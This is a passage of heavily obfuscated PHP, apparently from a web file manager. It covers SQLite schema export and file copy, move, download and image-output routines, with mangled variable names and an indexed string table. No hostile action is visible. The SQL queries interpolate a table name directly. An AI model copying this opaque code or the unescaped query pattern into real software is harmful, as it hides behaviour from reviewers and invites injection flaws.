$ÃßÉĞùí[$ŠĞŸ«ØÑ[1100]]; } if (isset($¦¥˜ŞĞ«[$ÃßÉĞùí[$ŠĞŸ«ØÑ[1098]]])) { $¦¥˜ŞĞ«[$ÃßÉĞùí[$ŠĞŸ«ØÑ[1098]]][$ŠĞŸ«ØÑ[1101]][] = $ÃßÉĞùí[$ŠĞŸ«ØÑ[1100]]; continue; } $¦¥˜ŞĞ«[$ÃßÉĞùí[$ŠĞŸ«ØÑ[1098]]] = array($ŠĞŸ«ØÑ[1102] => $ÃßÉĞùí[$ŠĞŸ«ØÑ[1098]], $ŠĞŸ«ØÑ[1101] => array($ÃßÉĞùí[$ŠĞŸ«ØÑ[1100]]), $ŠĞŸ«ØÑ[1103] => $ÃßÉĞùí[$ŠĞŸ«ØÑ[1104]] == $ŠĞŸ«ØÑ[98] ? 0 : 1); } $À¤‡–Õµ = array(); foreach ($¦¥˜ŞĞ« as $ÃßÉĞùí) { $àó²®— = $ÃßÉĞùí[$ŠĞŸ«ØÑ[1102]] == $ŠĞŸ«ØÑ[1099]; $˜®Ë¼ïÖ = array($ŠĞŸ«ØÑ[1105], $ÃßÉĞùí[$ŠĞŸ«ØÑ[1103]] == $ŠĞŸ«ØÑ[98] && !$àó²®— ? $ŠĞŸ«ØÑ[1106] : $ŠĞŸ«ØÑ[22], $ŠĞŸ«ØÑ[1107], $ŠĞŸ«ØÑ[1108] . $”İ§ªĞº . $ŠĞŸ«ØÑ[21] . ($àó²®— ? $ŠĞŸ«ØÑ[1109] : $ÃßÉĞùí[$ŠĞŸ«ØÑ[1102]]) . $ŠĞŸ«ØÑ[128], $ŠĞŸ«ØÑ[1110], $ŠĞŸ«ØÑ[128] . $”İ§ªĞº . $ŠĞŸ«ØÑ[128], $ŠĞŸ«ØÑ[1111] . implode($ŠĞŸ«ØÑ[1112], $ÃßÉĞùí[$ŠĞŸ«ØÑ[1101]]) . $ŠĞŸ«ØÑ[1113]); $À¤‡–Õµ[] = implode($ŠĞŸ«ØÑ[63], $˜®Ë¼ïÖ) . $ŠĞŸ«ØÑ[81]; } $×”ôÃõÍ = array(); $”ù½ƒ†Ş = array($ŠĞŸ«ØÑ[1114] => $ŠĞŸ«ØÑ[1115], $ŠĞŸ«ØÑ[1115] => $ŠĞŸ«ØÑ[1115], $ŠĞŸ«ØÑ[297] => $ŠĞŸ«ØÑ[324], $ŠĞŸ«ØÑ[296] => $ŠĞŸ«ØÑ[324]); foreach ($ï†»©èÏ as $ÃßÉĞùí) { $˜®Ë¼ïÖ = array($ŠĞŸ«ØÑ[128] . $ÃßÉĞùí[$ŠĞŸ«ØÑ[1116]] . $ŠĞŸ«ØÑ[128], isset($”ù½ƒ†Ş[$ÃßÉĞùí[$ŠĞŸ«ØÑ[1117]]]) ? $”ù½ƒ†Ş[$ÃßÉĞùí[$ŠĞŸ«ØÑ[1117]]] : $ÃßÉĞùí[$ŠĞŸ«ØÑ[1118]], $ÃßÉĞùí[$ŠĞŸ«ØÑ[1119]] == $ŠĞŸ«ØÑ[895] ? $ŠĞŸ«ØÑ[1120] : $ŠĞŸ«ØÑ[1121], $ÃßÉĞùí[$ŠĞŸ«ØÑ[1116]] == $ÏÀŸˆ™† ? $ŠĞŸ«ØÑ[1122] : $ŠĞŸ«ØÑ[22], $ÃßÉĞùí[$ŠĞŸ«ØÑ[946]] ? strtoupper(str_replace($ŠĞŸ«ØÑ[21], $ŠĞŸ«ØÑ[22], $ÃßÉĞùí[$ŠĞŸ«ØÑ[946]])) : $ŠĞŸ«ØÑ[22]); $×”ôÃõÍ[] = trim(implode($ŠĞŸ«ØÑ[63], $˜®Ë¼ïÖ)); } $ÉŞøíŠ± = array($ŠĞŸ«ØÑ[1123] . $”İ§ªĞº . $ŠĞŸ«ØÑ[1124], $ŠĞŸ«ØÑ[1125] . $”İ§ªĞº . $ŠĞŸ«ØÑ[1126], implode($ŠĞŸ«ØÑ[60] . PHP_EOL, $×”ôÃõÍ), $ŠĞŸ«ØÑ[943]); $£ğáÏÂ– = implode(PHP_EOL, array_merge($ÉŞøíŠ±, $À¤‡–Õµ)); if ($Ÿß¦òŸ¡ && $Ÿß¦òŸ¡ == $ŠĞŸ«ØÑ[23]) { return $£ğáÏÂ–; } $áüíŞŞÃ = array($ŠĞŸ«ØÑ[802] => $—’¨à¤, $ŠĞŸ«ØÑ[23] => $£ğáÏÂ–); return $Ÿß¦òŸ¡ ? $áüíŞŞÃ[$Ÿß¦òŸ¡] : $áüíŞŞÃ; } public function sqlFromSqlite($³ğèÄÕ¦, $™ô÷çªÙ = '') { $æöÉ¢¦û =& $_SERVER[¹Û¹Æ€]; $–Š¡“¾Å = $this->model()->db(); $ó‹İ¤ƒ = "\x50\x52\101\107\x4d\101\x20\124\101\x42\114\x45\137\111\116\106\117\40\x28\x27{$³ğèÄÕ¦}\x27\51"; $áùåƒº = "\x53\x45\x4c\x45\x43\x54\x20\x2a\40\106\122\x4f\115\x20\x73\x71\154\x69\x74\145\137\155\x61\163\164\145\x72\x20\127\110\105\x52\105\x20\x74\142\x6c\137\156\x61\155\145\x20\x3d\x20\x27{$³ğèÄÕ¦}\47"; $ô´ë‹†å = $–Š¡“¾Å->query($ó‹İ¤ƒ); if (empty($ô´ë‹†å)) { $’’¤ñà– = array($æöÉ¢¦û[802] => $æöÉ¢¦û[22], $æöÉ¢¦û[23] => $æöÉ¢¦û[22]); return $™ô÷çªÙ ? $’’¤ñà–[$™ô÷çªÙ] : $’’¤ñà–; } $î–Ôµé = $–Š¡“¾Å->query($áùåƒº); $×È£¨·† = $¡¼»Çç¡ = array(); foreach ($î–Ôµé as $æŒñÛÃ) { if ($æŒñÛÃ[$æöÉ¢¦û[43]] == $æöÉ¢¦û[288]) { $×È£¨·†[] = $æŒñÛÃ[$æöÉ¢¦û[1127]]; } else { $¡¼»Çç¡[$æŒñÛÃ[$æöÉ¢¦û[42]]] = $æŒñÛÃ[$æöÉ¢¦û[1127]]; } } $ÏıÉìóî = array_merge(array($æöÉ¢¦û[1123] . $³ğèÄÕ¦ . $æöÉ¢¦û[128]), $×È£¨·†, array_values($¡¼»Çç¡)); $ÏıÉìóî = implode($æöÉ¢¦û[81] . PHP_EOL, $ÏıÉìóî) . $æöÉ¢¦û[81]; if ($™ô÷çªÙ && $™ô÷çªÙ == $æöÉ¢¦û[23]) { return $ÏıÉìóî; } $•¼´­Üä = array(); $š“Âòø = array($æöÉ¢¦û[1115] => $æöÉ¢¦û[1128], $æöÉ¢¦û[324] => $æöÉ¢¦û[1129]); $‚­ÄôãÀ = $æöÉ¢¦û[22]; foreach ($ô´ë‹†å as $æŒñÛÃ) { if ($æŒñÛÃ[$æöÉ¢¦û[67]] == $æöÉ¢¦û[98]) { $‚­ÄôãÀ = $æŒñÛÃ[$æöÉ¢¦û[42]]; } $…ÁĞ…éà = array($æöÉ¢¦û[394] . $æŒñÛÃ[$æöÉ¢¦û[42]] . $æöÉ¢¦û[394], isset($š“Âòø[$æŒñÛÃ[$æöÉ¢¦û[43]]]) ? $š“Âòø[$æŒñÛÃ[$æöÉ¢¦û[43]]] : $æŒñÛÃ[$æöÉ¢¦û[43]], $æŒñÛÃ[$æöÉ¢¦û[45]] == $æöÉ¢¦û[98] ? $æöÉ¢¦û[1120] : $æöÉ¢¦û[1130] . $æŒñÛÃ[$æöÉ¢¦û[66]], $æŒñÛÃ[$æöÉ¢¦û[67]] == $æöÉ¢¦û[98] ? $æöÉ¢¦û[1131] : $æöÉ¢¦û[22]); $•¼´­Üä[] = trim(implode($æöÉ¢¦û[63], $…ÁĞ…éà)); } foreach ($¡¼»Çç¡ as $ß×ÈÍº => $ƒ„¤¨ˆª) { $‘Æ€™ = str_replace($æöÉ¢¦û[1132] . $³ğèÄÕ¦ . $æöÉ¢¦û[21], $æöÉ¢¦û[22], $ß×ÈÍº); $¶ÇñïÊö = str_replace(array($æöÉ¢¦û[128], $æöÉ¢¦û[954]), $æöÉ¢¦û[394], substr($ƒ„¤¨ˆª, stripos($ƒ„¤¨ˆª, $æöÉ¢¦û[269]))); if ($‘Æ€™ == $æöÉ¢¦û[1109]) { $‚¦¶ŒÁÌ = $æöÉ¢¦û[1133] . $‚­ÄôãÀ . $æöÉ¢¦û[1134]; } else { $‚¦¶ŒÁÌ = (stripos($‘Æ€™, $æöÉ¢¦û[21]) ? $æöÉ¢¦û[1135] : $æöÉ¢¦û[22]) . ($æöÉ¢¦û[1136] . $‘Æ€™ . $æöÉ¢¦û[1137] . $¶ÇñïÊö); } $•¼´­Üä[] = $‚¦¶ŒÁÌ; } $¬Ìóßìş = array($æöÉ¢¦û[1138] . $³ğèÄÕ¦ . $æöÉ¢¦û[1139], $æöÉ¢¦û[1140] . $³ğèÄÕ¦ . $æöÉ¢¦û[1141], implode($æöÉ¢¦û[60] . PHP_EOL, $•¼´­Üä), $æöÉ¢¦û[1142]); $²ğÚ˜”ë = implode(PHP_EOL, $¬Ìóßìş); if ($™ô÷çªÙ && $™ô÷çªÙ == $æöÉ¢¦û[802]) { return $²ğÚ˜”ë; } $’’¤ñà– = array($æöÉ¢¦û[802] => $²ğÚ˜”ë, $æöÉ¢¦û[23] => $ÏıÉìóî); return $™ô÷çªÙ ? $’’¤ñà–[$™ô÷çªÙ] : $’’¤ñà–; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Úàëîµ˜, $ÅÁ°»ã…) { $¶ĞœÚù– =& $_SERVER[¹Û¹Æ€]; $Œ‘ÖË = $ÅÁ°»ã…; $GLOBALS[$¶ĞœÚù–[1143]] = $¶ĞœÚù–[1144] . $Úàëîµ˜; Hook::trigger($¶ĞœÚù–[1144] . $Úàëîµ˜ . $¶ĞœÚù–[1145], $Œ‘ÖË); $­ÙÕ÷Íè = self::driverMake($ÅÁ°»ã…[0]); if (!$­ÙÕ÷Íè) { return !1; } if (method_exists($­ÙÕ÷Íè, $Úàëîµ˜)) { $“ÜĞÀÂÃ = @call_user_func_array(array($­ÙÕ÷Íè, $Úàëîµ˜), $ÅÁ°»ã…); } else { if (method_exists($­ÙÕ÷Íè, $¶ĞœÚù–[1146])) { $“ÜĞÀÂÃ = @call_user_func_array(array($­ÙÕ÷Íè, $Úàëîµ˜), $ÅÁ°»ã…); } else { if (method_exists(self, $Úàëîµ˜)) { $“ÜĞÀÂÃ = @call_user_func_array(array(self, $Úàëîµ˜), $ÅÁ°»ã…); } else { $“ÜĞÀÂÃ = call_user_func_array(array(parent, $Úàëîµ˜), $ÅÁ°»ã…); } } } Hook::trigger($¶ĞœÚù–[1144] . $Úàëîµ˜ . $¶ĞœÚù–[1147], $Œ‘ÖË, $“ÜĞÀÂÃ); return $“ÜĞÀÂÃ; } public static function init($ÉÙ€™Æ) { return self::driverMake($ÉÙ€™Æ); } public static function copy($óâÇ¶ûş, $›ôèã¾ƒ, $Ö¬Ç–²ê = false, $†€¼‚º = false) { return self::copyMoveStart($óâÇ¶ûş, $›ôèã¾ƒ, $Ö¬Ç–²ê, $_SERVER[¹Û¹Æ€][564], $†€¼‚º); } public static function move($ï’—´…®, $ªÄô•î, $î›®Üæ¸ = false, $·šá€ğ = false) { return self::copyMoveStart($ï’—´…®, $ªÄô•î, $î›®Üæ¸, $_SERVER[¹Û¹Æ€][566], $·šá€ğ); } private static function copyMoveStart($å°ê‚ñ, $³â‰ÏÜ, $¸Ö™ìÃ×, $œÊ‚ëõı, $Öò£¯›ş) { $Ôİü—¾ó =& $_SERVER[¹Û¹Æ€]; $ñä¢˜óÊ = array($å°ê‚ñ, $³â‰ÏÜ, $¸Ö™ìÃ×, $Öò£¯›ş); Hook::trigger($Ôİü—¾ó[1144] . $œÊ‚ëõı . $Ôİü—¾ó[1145], $ñä¢˜óÊ); $¡¯„½Û‹ = self::copyMove($å°ê‚ñ, $³â‰ÏÜ, $¸Ö™ìÃ×, $œÊ‚ëõı, $Öò£¯›ş); Hook::trigger($Ôİü—¾ó[1144] . $œÊ‚ëõı . $Ôİü—¾ó[1147], $ñä¢˜óÊ, $¡¯„½Û‹); return $¡¯„½Û‹; } public static function saveFile($‚£ñÇÌ, $÷Çëü’Ò, $—º‡»¶ = true) { $ÚãÍïµœ =& $_SERVER[¹Û¹Æ€]; $¬À¥À×á = self::info($÷Çëü’Ò); $åä«çËé = self::driverMake($‚£ñÇÌ); $å–ËÙŸÇ = self::driverMake($÷Çëü’Ò); $ƒ¦•¤òÑ = !1; if ($å–ËÙŸÇ->pathParse[$ÚãÍïµœ[1148]]) { $ƒ¦•¤òÑ = $å–ËÙŸÇ; $…ğ×Üøª = $å–ËÙŸÇ->pathParse[$ÚãÍïµœ[1148]]; $å–ËÙŸÇ = self::driverMake($…ğ×Üøª); } if ($åä«çËé->pathParse[$ÚãÍïµœ[1148]]) { $Î¯¿©ß¤ = $åä«çËé->pathParse[$ÚãÍïµœ[1148]]; $åä«çËé = self::driverMake($Î¯¿©ß¤); } $¥¥õœ•ù = $å–ËÙŸÇ->pathFather($÷Çëü’Ò); $‰µùôó† = !0; if (!$—º‡»¶ && self::driverIsSame($åä«çËé, $å–ËÙŸÇ)) { $‰µùôó† = !1; } $Ù½¿şËØ = self::copyFile($åä«çËé, $‚£ñÇÌ, $å–ËÙŸÇ, $¥¥õœ•ù, $¬À¥À×á[$ÚãÍïµœ[42]], $‰µùôó†); if ($ƒ¦•¤òÑ) { $Ù½¿şËØ = $ƒ¦•¤òÑ->getPathOuter($Ù½¿şËØ); } return $Ù½¿şËØ; } private static function copyMove($ƒò½­©º, $ª…ë‰¦Ÿ, $‘¶ôÆ¥ö, $º©äøåü, $Ë§öÅ…ñ = false) { $ÜƒìÓãò =& $_SERVER[¹Û¹Æ€]; if (!$ƒò½­©º || $ƒò½­©º == $ÜƒìÓãò[18] || !$ª…ë‰¦Ÿ) { return !1; } ignore_timeout(); $äåáÒã« = self::driverMake($ƒò½­©º); $œÀò¬›î = self::driverMake($ª…ë‰¦Ÿ); $ëòíœâ« = $º©äøåü == $ÜƒìÓãò[566]; $ÑıÈ»·† = !1; if ($œÀò¬›î->pathParse[$ÜƒìÓãò[1148]]) { $ÑıÈ»·† = $œÀò¬›î; $ª…ë‰¦Ÿ = $œÀò¬›î->pathParse[$ÜƒìÓãò[1148]]; $œÀò¬›î = self::driverMake($ª…ë‰¦Ÿ); } if ($äåáÒã«->pathParse[$ÜƒìÓãò[1148]]) { $ƒò½­©º = $äåáÒã«->pathParse[$ÜƒìÓãò[1148]]; $äåáÒã« = self::driverMake($ƒò½­©º); } self::check($äåáÒã«, $ƒò½­©º, $œÀò¬›î, $ª…ë‰¦Ÿ); Hook::trigger($ÜƒìÓãò[1149], $äåáÒã«, $ƒò½­©º, $œÀò¬›î, $ª…ë‰¦Ÿ); $˜ÑÔ¦³‚ = self::driverIsSame($äåáÒã«, $œÀò¬›î); if ($˜ÑÔ¦³‚) { if ($º©äøåü == $ÜƒìÓãò[566] && !method_exists($œÀò¬›î, $ÜƒìÓãò[1150]) && trim($ª…ë‰¦Ÿ, $ÜƒìÓãò[18]) == trim($œÀò¬›î->pathFather($ƒò½­©º), $ÜƒìÓãò[18])) { if ($äåáÒã«->pathThis($ƒò½­©º) != $Ë§öÅ…ñ && !$äåáÒã«->isTypeObject()) { return $äåáÒã«->rename($ƒò½­©º, $Ë§öÅ…ñ); } return $œÀò¬›î->getPathOuter($ƒò½­©º); } if (method_exists($œÀò¬›î, $º©äøåü)) { return $œÀò¬›î->{$º©äøåü}($ƒò½­©º, $ª…ë‰¦Ÿ, $‘¶ôÆ¥ö, $Ë§öÅ…ñ); } } if ($˜ÑÔ¦³‚ && $º©äøåü == $ÜƒìÓãò[566] && $œÀò¬›î->getType() == $ÜƒìÓãò[116]) { $Ãáá¦ŞÃ = $œÀò¬›î->movePath($ƒò½­©º, $ª…ë‰¦Ÿ, $Ë§öÅ…ñ); if ($Ãáá¦ŞÃ) { return $Ãáá¦ŞÃ; } } $¶à€šô© = $äåáÒã«->isFile($ƒò½­©º); if (!$¶à€šô© && $œÀò¬›î->getType() == $ÜƒìÓãò[756] && $äåáÒã«->getType() == $ÜƒìÓãò[116]) { $Ãáá¦ŞÃ = $œÀò¬›î->copyFolderFromIO($äåáÒã«, $ƒò½­©º, $ª…ë‰¦Ÿ, $‘¶ôÆ¥ö, $ëòíœâ«, $Ë§öÅ…ñ); } else { $Ãáá¦ŞÃ = self::copyPath($äåáÒã«, $ƒò½­©º, $œÀò¬›î, $ª…ë‰¦Ÿ, $‘¶ôÆ¥ö, $ëòíœâ«, $¶à€šô©, $Ë§öÅ…ñ); } if ($Ãáá¦ŞÃ && $ëòíœâ«) { $äåáÒã«->remove($ƒò½­©º); } if ($ÑıÈ»·†) { $Ãáá¦ŞÃ = $ÑıÈ»·†->getPathOuter($Ãáá¦ŞÃ); } return $Ãáá¦ŞÃ; } private static function check($ûç™í¹, $ÕÖïõ , $ŞÔù©Ğ, &$ë›“İ¸Õ) { $÷£» ĞŸ =& $_SERVER[¹Û¹Æ€]; if (self::driverIsSame($ûç™í¹, $ŞÔù©Ğ) && $ûç™í¹->isFolder($ÕÖïõ ) && $ûç™í¹->isParentOf($ÕÖïõ , $ë›“İ¸Õ)) { show_json(LNG($÷£» ĞŸ[1151]), !1); } if (!$ûç™í¹->exist($ÕÖïõ )) { show_json(LNG($÷£» ĞŸ[115]), !1); } } private static function copyPath($¬¶ÍŒÃ‰, $Ò¿•šÍÔ, $‹è×²•, $Úº…ğº, $Î”¢Ãë, $¼íÃóÇÀ, $«ŠÀ•Í°, $­Ô¾ÆÜä = false, $é‡º‰·È = true) { $…çµÔş¼ =& $_SERVER[¹Û¹Æ€]; $ƒıÛòËÒ = empty($­Ô¾ÆÜä) && $­Ô¾ÆÜä !== $…çµÔş¼[207] ? $¬¶ÍŒÃ‰->pathThis($Ò¿•šÍÔ) : $­Ô¾ÆÜä; if ($Î”¢Ãë) { $èˆÔŞ¦ = $‹è×²•->fileNameExist($Úº…ğº, $ƒıÛòËÒ); $Õ÷›¦» = $ƒıÛòËÒ; $ƒıÛòËÒ = $‹è×²•->fileNameAuto($Úº…ğº, $ƒıÛòËÒ, $Î”¢Ãë, !$«ŠÀ•Í°); if (!$èˆÔŞ¦ || $Õ÷›¦» != $ƒıÛòËÒ) { $Î”¢Ãë = !1; } if ($é‡º‰·È && !$Î”¢Ãë) { $‹è×²•->_data[$…çµÔş¼[1152]] = !0; } } if ($«ŠÀ•Í°) { return self::copyFile($¬¶ÍŒÃ‰, $Ò¿•šÍÔ, $‹è×²•, $Úº…ğº, $ƒıÛòËÒ, $¼íÃóÇÀ); } if ($Î”¢Ãë == REPEAT_RENAME_FOLDER) { $Î”¢Ãë = !1; } $è—ïÙøª = rtrim($Úº…ğº, $…çµÔş¼[18]) . $…çµÔş¼[18] . $ƒıÛòËÒ; $˜Ö•®Ê± = $‹è×²•->mkdir($‹è×²•->getPath($è—ïÙøª), $Î”¢Ãë); $Úº…ğº = $‹è×²•->getPathInner($˜Ö•®Ê±); $¬¦ø¾‰ = $¬¶ÍŒÃ‰->listPath($Ò¿•šÍÔ, !0); $¬¦ø¾‰ = is_array($¬¦ø¾‰) ? $¬¦ø¾‰ : array($…çµÔş¼[93] => array(), $…çµÔş¼[92] => array()); $ÏÁËÒß“ = array_merge($¬¦ø¾‰[$…çµÔş¼[93]], $¬¦ø¾‰[$…çµÔş¼[92]]); foreach ($ÏÁËÒß“ as $Šøªªïß) { $¾³‘ñ”ç = $Šøªªïß[$…çµÔş¼[43]] == $…çµÔş¼[209]; $Ò¿•šÍÔ = $¬¶ÍŒÃ‰->getPathInner($Šøªªïß[$…çµÔş¼[94]]); $–ê´Í‡× = self::copyPath($¬¶ÍŒÃ‰, $Ò¿•šÍÔ, $‹è×²•, $Úº…ğº, $Î”¢Ãë, $¼íÃóÇÀ, $¾³‘ñ”ç, !1, !1); if (!$–ê´Í‡×) { IO::errorTips($…çµÔş¼[1153] . $Ò¿•šÍÔ . $…çµÔş¼[80] . $Úº…ğº); } } self::copyMoveKeepInfo($¬¶ÍŒÃ‰, $Ò¿•šÍÔ, $˜Ö•®Ê±); return $˜Ö•®Ê±; } private static function copyFile($ïÂÊÙ’, $½­¥¨óı, $÷ù±Öµ, $§²„´Ïˆ, $Ğ®§Œ‚ñ, $èùù¹¡º) { $€Âù—ùå =& $_SERVER[¹Û¹Æ€]; $§²„´Ïˆ = $÷ù±Öµ->getPath(rtrim($§²„´Ïˆ, $€Âù—ùå[18]) . $€Âù—ùå[18] . $Ğ®§Œ‚ñ); $¹¤¦ÌŠÁ = $€Âù—ùå[1154] . time() . rand_string(5); Hook::trigger($€Âù—ùå[1155], $ïÂÊÙ’, $½­¥¨óı, $÷ù±Öµ, $§²„´Ïˆ, $Ğ®§Œ‚ñ, $¹¤¦ÌŠÁ); if (self::driverIsSame($ïÂÊÙ’, $÷ù±Öµ)) { if ($èùù¹¡º) { $¹íĞğß‹ = $÷ù±Öµ->moveFile($½­¥¨óı, $§²„´Ïˆ); } else { $¹íĞğß‹ = $÷ù±Öµ->copyFile($½­¥¨óı, $§²„´Ïˆ); } Hook::trigger($€Âù—ùå[1156], $ïÂÊÙ’, $½­¥¨óı, $÷ù±Öµ, $§²„´Ïˆ, $Ğ®§Œ‚ñ, $¹íĞğß‹); self::copyMoveKeepInfo($ïÂÊÙ’, $½­¥¨óı, $¹íĞğß‹); return $¹íĞğß‹; } $İñ•İ‘‹ = TEMP_FILES; if ($GLOBALS[$€Âù—ùå[16]][$€Âù—ùå[99]][$€Âù—ùå[794]]) { $İñ•İ‘‹ = $GLOBALS[$€Âù—ùå[16]][$€Âù—ùå[99]][$€Âù—ùå[794]]; } $Ê¯—œ€Ç = $İñ•İ‘‹; mk_dir($Ê¯—œ€Ç); $Åôš®Ú˜ = $Ê¯—œ€Ç . $¹¤¦ÌŠÁ; $ÒÎÇÓˆ® = $Åôš®Ú˜; $Åôš®Ú˜ = $ïÂÊÙ’->download($½­¥¨óı, $Åôš®Ú˜); $Åôš®Ú˜ = $ïÂÊÙ’->iconvApp($Åôš®Ú˜); if (substr($Åôš®Ú˜, strlen($İñ•İ‘‹)) == $İñ•İ‘‹) { $èùù¹¡º = !0; } $¹íĞğß‹ = $÷ù±Öµ->upload($§²„´Ïˆ, $Åôš®Ú˜, $èùù¹¡º); self::remove($ÒÎÇÓˆ®); Hook::trigger($€Âù—ùå[1156], $ïÂÊÙ’, $½­¥¨óı, $÷ù±Öµ, $§²„´Ïˆ, $Ğ®§Œ‚ñ, $¹íĞğß‹); self::copyMoveKeepInfo($ïÂÊÙ’, $½­¥¨óı, $¹íĞğß‹); return $¹íĞğß‹; } private static function copyMoveKeepInfo($ºéÇñ…², $Ï§¾ø®ê, $Îşµ•„) { if (!$Îşµ•„) { return; } $´²Ğ²ë‰ = $ºéÇñ…²->info($Ï§¾ø®ê); if (!is_array($´²Ğ²ë‰)) { return; } IO::setModifyTime($Îşµ•„, $´²Ğ²ë‰[$_SERVER[¹Û¹Æ€][95]]); } public static function pathFather($ˆËò‚êÄ) { $™˜·µÏ• = IO::init($ˆËò‚êÄ); $½Î¬Ü‹­ = $™˜·µÏ•->pathFather($™˜·µÏ•->path); return $™˜·µÏ•->getPathOuter($½Î¬Ü‹­); } public static function fileOut($¶—êäÌ, $üÛúš = false, $×İÎÕŒ« = false, $ˆŒÁç§ø = '') { $ˆ×àÀ§ñ = self::driverMake($¶—êäÌ); if ($ˆ×àÀ§ñ->isFileOutServer()) { return $ˆ×àÀ§ñ->fileOutServer($¶—êäÌ, $üÛúš, $×İÎÕŒ«, $ˆŒÁç§ø); } return $ˆ×àÀ§ñ->fileOut($¶—êäÌ, $üÛúš, $×İÎÕŒ«, $ˆŒÁç§ø); } public static function fileOutImage($¿üëØÇÕ, $‡¾Ÿ¶¬ = 250) { $²¯Ë‚«¯ = array(250, 600, 1200, 2000, 3000, 5000); for ($¯‰¢¨³ = 0; $¯‰¢¨³ < count($²¯Ë‚«¯); $¯‰¢¨³++) { if ($¯‰¢¨³ == 0 && $‡¾Ÿ¶¬ <= $²¯Ë‚«¯[$¯‰¢¨³]) { $‡¾Ÿ¶¬ = $²¯Ë‚«¯[$¯‰¢¨³]; break; } else { if ($‡¾Ÿ¶¬ > $²¯Ë‚«¯[$¯‰¢¨³ - 1] && $‡¾Ÿ¶¬ <= $²¯Ë‚«¯[$¯‰¢¨³]) { $‡¾Ÿ¶¬ = $²¯Ë‚«¯[$¯‰¢¨³]; break; } else { if ($¯‰¢¨³ == count($²¯Ë‚«¯) - 1 && $‡¾Ÿ¶¬ > $²¯Ë‚«¯[$¯‰¢¨³]) { $‡¾Ÿ¶¬ = $²¯Ë‚«¯[$¯‰¢¨³]; break; } } } } $Ø¤ÏôØ = self::driverMake($¿üëØÇÕ); if ($Ø¤ÏôØ->isFileOutServer()) { return $Ø¤ÏôØ->fileOutImageServer($¿üëØÇÕ, $‡¾Ÿ¶¬); } return $Ø¤ÏôØ->fileOutImage($¿üëØÇÕ, $‡¾Ÿ¶¬); } private static function driverIsSame($©ÀØÚí, $ÏØÛÜü¼) { $Ş¹Â‡¡ =& $_SERVER[¹Û¹Æ€]; $Ü»Ö·Ğ› = $©ÀØÚí->getType(); $˜„ñî¬ = $ÏØÛÜü¼->getType(); if ($Ü»Ö·Ğ› != $˜„ñî¬) { return !1; } if ($Ü»Ö·Ğ› == $Ş¹Â‡¡[756]) { return !0; } if ($Ü»Ö·Ğ› == $Ş¹Â‡¡[116]) { return !0; } if ($©ÀØÚí->pathDriver == $ÏØÛÜü¼->pathDriver) { return !0; } return !1; } public static function copyUpdate($ª¦æéáè, $Ğ½ÑÓ) { $ŠĞğÇô =& $_SERVER[¹Û¹Æ€]; if (!IO::exist($ª¦æéáè)) { return !1; } if (!IO::exist($Ğ½ÑÓ)) { IO::mkdir($Ğ½ÑÓ); } $Ù©ï‚«² = self::_listAll($ª¦æéáè); $ªã“ÉÚÇ = self::_listAll($Ğ½ÑÓ); $›æŠ‹°´ = array(); $íùüªşª = array(); foreach ($Ù©ï‚«² as $ıŞ¹àÅ => $•”İÕ¦™) { if (isset($ªã“ÉÚÇ[$ıŞ¹àÅ])) { if ($•”İÕ¦™[$ŠĞğÇô[85]] == 1) { continue; } if ($ªã“ÉÚÇ[$ıŞ¹àÅ][$ŠĞğÇô[86]] == $•”İÕ¦™[$ŠĞğÇô[86]]) { continue; } } if ($•”İÕ¦™[$ŠĞğÇô[85]] == 1) { $íùüªşª[] = $Ğ½ÑÓ . $ŠĞğÇô[18] . $ıŞ¹àÅ; continue; } $½„¬€Û = strstr(trim($ıŞ¹àÅ, $ŠĞğÇô[18]), $ŠĞğÇô[18]) ? get_path_father($ıŞ¹àÅ) : $ŠĞğÇô[22]; $›æŠ‹°´[] = array($ŠĞğÇô[1157] => $•”İÕ¦™[$ŠĞğÇô[94]], $ŠĞğÇô[1158] => rtrim($Ğ½ÑÓ, $ŠĞğÇô[18]) . $ŠĞğÇô[18] . $½„¬€Û, $ŠĞğÇô[1159] => $•”İÕ¦™); } $ô—È’Óã = array($ŠĞğÇô[209] => $›æŠ‹°´, $ŠĞğÇô[85] => $íùüªşª); Hook::trigger($ŠĞğÇô[1160], $ª¦æéáè, $Ğ½ÑÓ, $ô—È’Óã); foreach ($íùüªşª as $•”İÕ¦™) { IO::mkdir($•”İÕ¦™); } foreach ($›æŠ‹°´ as $•”İÕ¦™) { IO::copy($•”İÕ¦™[$ŠĞğÇô[1157]], $•”İÕ¦™[$ŠĞğÇô[1158]], REPEAT_REPLACE); } } private static function _listAll($¬àûƒ®˜) { $áç Ã¸† =& $_SERVER[¹Û¹Æ€]; $¬àûƒ®˜ = KodIO::clear($¬àûƒ®˜); $½´Ê£ºõ = IO::listAll($¬àûƒ®˜); foreach ($½´Ê£ºõ as &$æç™ÃÂ®) { $å¶Ç‹•ï = substr($æç™ÃÂ®[$áç Ã¸†[94]], strlen($¬àûƒ®˜)); $æç™ÃÂ®[$áç Ã¸†[1161]] = trim($å¶Ç‹•ï, $áç Ã¸†[18]); } unset($æç™ÃÂ®); return array_to_keyvalue($½´Ê£ºõ, $áç Ã¸†[1161]); } public static function fileSubstr($Â±¤‡‚, $§ƒŒš©, $ÁóòÂçÒ = false) { $¬û‡Õ”Ñ =& $_SERVER[¹Û¹Æ€]; $¬³èî« = self::driverMake($Â±¤‡‚); $á©°ÎŞ = $¬³èî«->size($Â±¤‡‚); $»«¡½Îî = $§ƒŒš©; $÷ÔÎÄÇÏ = $ÁóòÂçÒ; if ($§ƒŒš© < 0) { $§ƒŒš© = $á©°ÎŞ + $§ƒŒš©; } if ($ÁóòÂçÒ === !1) { $ÁóòÂçÒ = $á©°ÎŞ - $§ƒŒš©; } if ($§ƒŒš© + $ÁóòÂçÒ > $á©°ÎŞ) { $ÁóòÂçÒ = $á©°ÎŞ - $§ƒŒš©; } if (!$á©°ÎŞ && $¬³èî«->getType() == $¬û‡Õ”Ñ[116] && !$¬³èî«->exist($Â±¤‡‚)) { $ø‡×Íá = get_path_this($Â±¤‡‚); $äÊË‡Üé = parse_url_query($ø‡×Íá); if (is_array($äÊË‡Üé) && isset($äÊË‡Üé[$¬û‡Õ”Ñ[42]])) { $ø‡×Íá = urldecode($äÊË‡Üé[$¬û‡Õ”Ñ[42]]); } throw new Exception($¬û‡Õ”Ñ[1162] . LNG($¬û‡Õ”Ñ[1163]) . $¬û‡Õ”Ñ[963] . clear_html($ø‡×Íá) . $¬û‡Õ”Ñ[22]); } if ($ÁóòÂçÒ <= 0) { return $¬û‡Õ”Ñ[22]; } if ($§ƒŒš© < 0 || $§ƒŒš© >= $á©°ÎŞ || $ÁóòÂçÒ > 1024 * 1024 * 10) { throw new 